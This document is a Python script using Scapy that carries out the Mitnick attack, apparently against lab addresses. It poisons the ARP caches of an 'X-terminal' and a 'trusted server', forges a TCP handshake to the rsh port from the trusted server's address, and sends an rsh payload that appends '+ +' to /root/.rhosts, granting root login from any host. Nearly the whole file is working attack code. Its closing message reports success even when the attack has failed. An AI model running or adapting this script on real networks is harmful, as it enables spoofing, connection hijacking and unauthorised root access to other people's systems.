import os
import subprocess
from re import search
from time import sleep
from scapy.all import *

# Function to retrieve MAC address of a certain ip_address
def get_mac(ip_address="10.9.0.1"):
    if ip_address == "10.9.0.1":    
        try:
            result = subprocess.run(['ifconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            ifconfig_output = result.stdout
            # Split the output into sections for each interface
            interfaces = ifconfig_output.split('\n\n')           
            for interface in interfaces:
                if ip_address in interface:
                    # Find the MAC address in the relevant section
                    mac_match = search(r'ether ([\da-fA-F:]{17})', interface)
                    if mac_match:
                        return mac_match.group(1)
            raise RuntimeError(f"MAC address not found for the given IP{ip_address} address.")
        except subprocess.CalledProcessError as e:
            raise RuntimeError(f"Failed to run ifconfig: {e}")
    else:
        match = os.popen(f"arp | grep {ip_address} | awk '{{print $3}}'").read().strip()
        while match == "":
            print(f"[*] Pinging {ip_address} to update ARP table")
            # Send ping to populate ARP Table
            ping_packet = IP(dst=ip_address)/ICMP()
            send(ping_packet, verbose=False)
            match = os.popen(f"arp | grep {ip_address} | awk '{{print $3}}'").read().strip()
            sleep(1)
        return match
    
# Function to mess with ARP Tables
def arp_spoof(target_ip, target_mac, spoof_ip, attacker_mac):
    # Create an ARP response packet
    arp_packet = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac, op=1)
    print(f"[***] Sending ARP packet to IP:{target_ip} MAC:{target_mac} | associating {spoof_ip} with MAC {attacker_mac}.")
    # Send the ARP response packet in a loop to maintain the spoof   
    try:
        for _ in range(10):
            send(arp_packet, verbose=False)
            sleep(0.1)  # Wait 0.1 seconds before sending the next packet
    except KeyboardInterrupt:
        print("[***] ARP spoofing stopped.")
        exit(0)

# Função to start TCP connection
def tcp_hijack(server_ip="10.9.0.6", terminal_ip="10.9.0.5", src_port=1023, dst_port=514, sequence=1000):    
    # 1. Send SYN packet
    print("[*] Sending SYN packet:")
    syn_packet = IP(src=server_ip, dst=terminal_ip)/TCP(sport=src_port, dport=dst_port, flags='S', seq=sequence)
    syn_packet[TCP].show()
    syn_ack_packet = sr1(syn_packet)
    
    # 2. Receive SYN-ACK packet
    if syn_ack_packet[TCP].flags == 'SA':
        print("[*] SYN-ACK packet received:")
        syn_ack_packet[TCP].show()
        isn = syn_ack_packet[TCP].seq + 1
        print(f"[*] ISN: {isn-1}")
        
        # 3. Send ACK to complete 3-way handshake
        ack_packet = IP(src=server_ip, dst=terminal_ip)/TCP(sport=src_port, dport=dst_port, flags='A', seq=sequence + 1, ack=isn)
        print("[*] Sending ACK packet:")
        ack_packet[TCP].show()
        send(ack_packet, verbose=False)
        print("[*] ACK packet sent")
        sequence = sequence + 1
        return sequence, isn
    else:
        raise ValueError("Failed to receive SYN-ACK packet.")

# Function to initiate RSH connection
def rsh_connection(server_ip="10.9.0.6", terminal_ip="10.9.0.5", src_port=1023, dst_port=514, sequence=None, isn=None):
    # Payload that adds "+ +" to the .rhosts file
    payload = b"\x00root\x00root\x00echo + + >> /root/.rhosts \x00"
    # RSH config of connection
    rsh_packet = IP(src=server_ip, dst=terminal_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", seq=sequence, ack=isn)/payload
    print("[*] Sending RSH packet:")
    rsh_packet[TCP].show()
    response = sr1(rsh_packet)
    print("[*] RSH connection asnwered:")
    response[TCP].show()

def main():
    print("[*] Starting Mitnick Attack")
    try:
        # Setup of IP`s`
        trusted_server_ip = "10.9.0.6"
        x_terminal_ip = "10.9.0.5"
        
        # Setup Ports
        src_port = 1023
        dst_port = 514
        
        # Setup sequence number
        seq = 100
        
        # Disable IP forwarding
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        
        # Get my MAC address 
        attacker_mac = get_mac()
        print(f"[*] My MAC address: {attacker_mac}")
        
        # Get MAC address of trusted_server
        print(f"[*] Getting MAC of Trusted Server, IP:{trusted_server_ip}")
        trusted_server_mac = get_mac(trusted_server_ip)
        print(f"[*] Trusted Server MAC: {trusted_server_mac}")
        
        # Get MAC address of x_terminal
        print(f"[*] Getting MAC from X-terminal, IP:{x_terminal_ip}")
        x_terminal_mac = get_mac(x_terminal_ip)
        print(f"[*] X-terminal MAC: {x_terminal_mac}")
        
        # Spoof table of x_terminal
        arp_spoof(x_terminal_ip, x_terminal_mac, trusted_server_ip, attacker_mac)
        # Spoof table of trusted_server
        arp_spoof(trusted_server_ip, trusted_server_mac, x_terminal_ip, attacker_mac)
        
        # Estabilish TCP Connection
        sequence, isn = tcp_hijack(server_ip=trusted_server_ip, terminal_ip=x_terminal_ip, src_port=src_port, dst_port=dst_port, sequence=seq)

        # Send command to .rhosts
        rsh_connection(server_ip=trusted_server_ip, terminal_ip=x_terminal_ip, src_port=src_port, dst_port=dst_port, sequence=sequence, isn=isn)        
    except KeyboardInterrupt:
        print("[*] Attack stop by the user")    
        exit(0)
    except ValueError as e:
        print(f"ERROR: Unexpected value error: {e}")
        exit(1)        
    except Exception as e:
        print(f"ERROR: Unexpected exception: {e}")
        exit(1) 
    finally:
        print(f"[*] Mitnick Attack completed successfully.")
        exit(0)

if __name__ == "__main__":
    main()